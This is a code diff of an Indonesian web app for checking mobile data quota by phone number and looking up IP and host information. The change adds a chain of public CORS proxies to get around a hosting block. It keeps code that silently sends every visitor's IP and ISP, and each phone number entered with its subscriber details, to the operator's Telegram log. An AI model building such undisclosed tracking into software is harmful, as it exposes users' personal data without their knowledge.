@@ -155,7 +155,6 @@
             <input type="text" id="hostInput" placeholder="example.com" class="input-cyber flex-1 bg-black/50 border border-white/10 text-white font-code px-4 py-2 rounded-lg outline-none">
             <button id="btnCheckHostAction" class="bg-cyber-green text-black font-bold font-code px-4 rounded-lg hover:bg-white"><i class="fa-solid fa-search"></i></button>
          </div>
-         <p class="text-[9px] text-gray-500 font-code mt-2 italic">*Support Domain & IP</p>
       </div>
     </div>
 
@@ -259,6 +258,11 @@
     </div>
   </main>
 
+  <a href="https://chat.whatsapp.com/H4wD01XzngRJo3ORjKKV3V" target="_blank" 
+     class="fixed bottom-6 left-6 z-50 w-14 h-14 bg-[#25D366] rounded-full flex items-center justify-center text-white text-3xl shadow-[0_0_20px_rgba(37,211,102,0.6)] hover:scale-110 hover:shadow-[0_0_30px_#25D366] transition-all duration-300">
+    <i class="fa-brands fa-whatsapp animate-[pulse_2s_infinite]"></i>
+  </a>
+
   <div id="installModal" class="fixed bottom-6 left-1/2 transform -translate-x-1/2 z-50 hidden w-[90%] max-w-sm">
     <div class="pwa-toast rounded-2xl p-4 flex items-center justify-between gap-3 backdrop-blur-xl">
       <div class="flex items-center gap-3">
@@ -278,13 +282,7 @@
   </div>
 
   <script>
-    // --- KONFIGURASI LOG ---
     const API_LOG = '/api/telegram';
-    
-    // --- PROXY CONFIG (UNTUK KUOTA - BYPASS BLOKIR VERCEL) ---
-    const PROXY_URL = "https://corsproxy.io/?"; 
-    const TARGET_BASE = "https://sidompul.kuncung.qzz.io/?number=";
-
     let visitorIP = 'Unknown'; 
 
     // --- UTILS ---
@@ -305,27 +303,59 @@
       return 0;
     };
     
-    // --- FORCE FRESH FETCH (UNTUK IP CHECK) ---
+    // --- FORCE FRESH FETCH (ANTI-CACHE) ---
     const fetchFresh = async (url) => {
       const separator = url.includes('?') ? '&' : '?';
       const randomUrl = `${url}${separator}nocache=${Date.now()}_${Math.random()}`;
-      
       const res = await fetch(randomUrl, { 
         method: 'GET',
         cache: 'no-store', 
-        headers: {
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Pragma': 'no-cache',
-            'Expires': '0'
-        }
       });
       return res.json();
     }
 
+    // --- MULTI-PROXY ENGINE (THE FIX) ---
+    // Logika ini akan mencoba beberapa jalur jika salah satu gagal (HTML Error)
+    const fetchWithFallback = async (targetNumber) => {
+      const targetUrl = `https://sidompul.kuncung.qzz.io/?number=${targetNumber}`;
+      
+      // Daftar Proxy (Prioritas)
+      const proxies = [
+        `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`,
+        `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`,
+        `https://thingproxy.freeboard.io/fetch/${encodeURIComponent(targetUrl)}`
+      ];
+
+      let lastError = null;
+
+      for (const proxy of proxies) {
+        try {
+          console.log("Trying proxy:", proxy);
+          const res = await fetch(proxy);
+          const text = await res.text(); // Ambil teks dulu untuk cek HTML
+
+          // Cek apakah response HTML (Error)
+          if (text.trim().startsWith('<')) {
+            throw new Error("Proxy returning HTML error");
+          }
+
+          const data = JSON.parse(text); // Parsing JSON
+          
+          // Cek struktur data Kuncung
+          if (data.status === true || data.success === true || (data.data && data.data.subs_info)) {
+            return data; // Sukses! Kembalikan data
+          }
+        } catch (e) {
+          console.log("Proxy fail, trying next...");
+          lastError = e;
+        }
+      }
+      throw new Error("Semua server sibuk. Coba lagi nanti.");
+    };
+
     // --- APP LOGIC ---
     let lastTgMsg = "";
 
-    // STATE HELPERS
     function showLoading(msg = "CONNECTING...") {
         document.getElementById('homeView').classList.add('hidden');
         document.getElementById('resultView').classList.add('hidden');
@@ -348,7 +378,7 @@
         document.getElementById('hostInput').value = '';
     }
 
-    // --- PWA LOGIC ---
+    // --- PWA ---
     let deferredPrompt;
     const installModal = document.getElementById('installModal');
     const installBtn = document.getElementById('installBtn');
@@ -372,7 +402,7 @@
     });
     closeInstall.addEventListener('click', () => installModal.classList.add('hidden'));
 
-    // --- MAIN FEATURE 1: CEK KUOTA (DIRECT FETCH) ---
+    // --- MAIN ACTION: CEK KUOTA ---
     document.getElementById('cekBtn').addEventListener('click', async () => {
       const input = document.getElementById('nomor');
       let val = input.value.trim();
@@ -383,17 +413,13 @@
 
       if(val.length < 10) return alert('Nomor tidak valid');
       
-      showLoading("SCANNING...");
+      showLoading("MENGHUBUNGKAN SERVER...");
       document.getElementById('paketContainer').innerHTML = '';
       sendLog(`<b>🔍 SCAN NOMOR...</b>\nTarget: <code>${val}</code>`, 'INPUT');
 
       try {
-        // USE PROXY TO BYPASS VERCEL BLOCK
-        const finalUrl = PROXY_URL + encodeURIComponent(TARGET_BASE + apiNum);
-        const res = await fetch(finalUrl);
-        const data = await res.json();
-        
-        if(!data.status && !data.success && !data.data) throw new Error('Gagal. Server sibuk.');
+        // USE MULTI-PROXY ENGINE
+        const data = await fetchWithFallback(apiNum);
 
         const sub = data.data.subs_info;
         const pkgs = data.data.package_info.packages;
@@ -416,7 +442,6 @@
 
         let totalAll = 0, sisaAll = 0;
         
-        // Telegram Message
         let tgMsg = `<b>✅ HASIL SCAN DETAIL</b>\n━━━━━━━━━━━━━━━━━━\n<b>👤 PELANGGAN</b>\n• Nomor HP: <code>${sub.msisdn}</code>\n• Masa Aktif: ${sub.exp_date}\n• Umur Kartu: ${sub.tenure || '-'}\n• Jaringan: ${sub.net_type}\n`;
         const stat = (s) => s ? '✅' : '❌';
         tgMsg += `• VoLTE: HP(${stat(v.device)}) Lokasi(${stat(v.area)}) Kartu(${stat(v.simcard)})\n\n<b>📦 RINCIAN PAKET LENGKAP</b>\n`;
@@ -488,14 +513,13 @@
       } catch (err) { showError(err.message); }
     });
 
-    // --- MAIN FEATURE 2: CEK MY IP ---
+    // --- OTHER FEATURES ---
     document.getElementById('btnMyIP').addEventListener('click', async () => {
         showLoading("MENDETEKSI IP TERBARU...");
         try {
             const d = await fetchFresh('https://ipwho.is/');
             if(!d.success) throw new Error(d.message || "Gagal");
             renderIpResult(d, "MY IP ADDRESS");
-            
             document.getElementById('resultView').classList.remove('hidden');
             document.getElementById('quotaResult').classList.add('hidden');
             document.getElementById('ipResult').classList.remove('hidden');
@@ -503,14 +527,11 @@
             
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
-            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS</b>\n• Pelaku: <code>${d.ip}</code>\n• Action: <b>🔍 CEK IP SENDIRI</b>\n• ISP: ${isp}\n• Lokasi: ${d.city}, ${d.country} ${flag}`;
-            sendLog(tgMsg, 'IP_CHECK');
+            sendLog(`<b>🔍 CEK IP SENDIRI</b>\nIP: ${d.ip}\nISP: ${isp}\nLokasi: ${d.city}, ${d.country} ${flag}`, 'IP_CHECK');
         } catch (e) { showError("Gagal Cek IP."); }
     });
 
-    // --- MAIN FEATURE 3: CEK HOST ---
     document.getElementById('btnToggleHost').addEventListener('click', () => { document.getElementById('hostInputArea').classList.toggle('hidden'); });
-    
     document.getElementById('btnCheckHostAction').addEventListener('click', async () => {
         let host = document.getElementById('hostInput').value.trim().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
         if(!host) return alert("Masukkan Host!");
@@ -525,20 +546,16 @@
                targetIP = dnsData.Answer.find(a => a.type === 1)?.data;
                if(!targetIP) throw new Error("IPv4 tidak ditemukan");
             }
-
             const d = await fetchFresh(`https://ipwho.is/${targetIP}`); 
             if(!d.success) throw new Error(d.message || "Gagal");
-
             renderIpResult(d, `HOST: ${host}`);
-            
             document.getElementById('resultView').classList.remove('hidden');
             document.getElementById('quotaResult').classList.add('hidden');
             document.getElementById('ipResult').classList.remove('hidden');
             document.getElementById('loading').classList.add('hidden');
             
             const flag = getFlagEmoji(d.country_code);
-            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS</b>\n• Pelaku: <code>${visitorIP}</code>\n• Action: <b>📡 CEK HOST</b>\n• Target: <code>${host}</code>\n• Real IP: <code>${d.ip}</code>\n• Negara: ${d.country} ${flag}`;
-            sendLog(tgMsg, 'IP_HOST_CHECK');
+            sendLog(`<b>📡 CEK HOST</b>\nTarget: ${host}\nIP: ${d.ip}\nNegara: ${d.country} ${flag}`, 'IP_HOST_CHECK');
         } catch (e) { showError("Gagal Lookup: " + e.message); }
     });
 
@@ -550,10 +567,6 @@
 
         let html = `
             <div class="grid grid-cols-1 gap-2">
-                <div class="bg-black/40 p-2 rounded border border-white/5">
-                    <span class="text-gray-500 text-[10px] block">TARGET</span>
-                    <span class="text-sm text-cyber-cyan font-bold">${title}</span>
-                </div>
                 <div class="bg-black/40 p-2 rounded border border-white/5">
                     <span class="text-gray-500 text-[10px] block">IP ADDRESS</span>
                     <span class="text-xl text-cyber-green font-bold">${d.ip}</span>
@@ -580,23 +593,20 @@
             </div>
         `;
         c.innerHTML = html;
-        lastTgMsg = `🔍 ${title}\nIP: ${d.ip}\nISP: ${isp}\nNegara: ${d.country} ${flag}\nKoordinat: ${d.latitude},${d.longitude}`;
+        lastTgMsg = `🔍 ${title}\nIP: ${d.ip}\nISP: ${isp}\nNegara: ${d.country} ${flag}`;
     }
 
     document.getElementById('copyBtn').addEventListener('click', () => {
       if(lastTgMsg) { navigator.clipboard.writeText(lastTgMsg); alert('Disalin!'); }
     });
 
-    // --- VISITOR LOAD ---
     window.addEventListener('load', async () => { 
         try { 
             const d = await fetchFresh('https://ipwho.is/');
             if(!d.success) throw new Error();
             visitorIP = d.ip;
-            const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
-            const logVisitor = `<b>👤 PENGUNJUNG BARU (DETAIL)</b>\n━━━━━━━━━━━━━━━━━━\n• IP: <code>${d.ip}</code>\n• ISP: ${isp}\n• Lokasi: ${d.city}, ${d.country} ${flag}\n• UA: <i>${navigator.userAgent}</i>`;
-            sendLog(logVisitor, 'VISITOR'); 
+            sendLog(`<b>👤 VISITOR</b>\nIP: ${d.ip}\nISP: ${isp}`, 'VISITOR'); 
         } catch (e) {} 
     });
   </script>
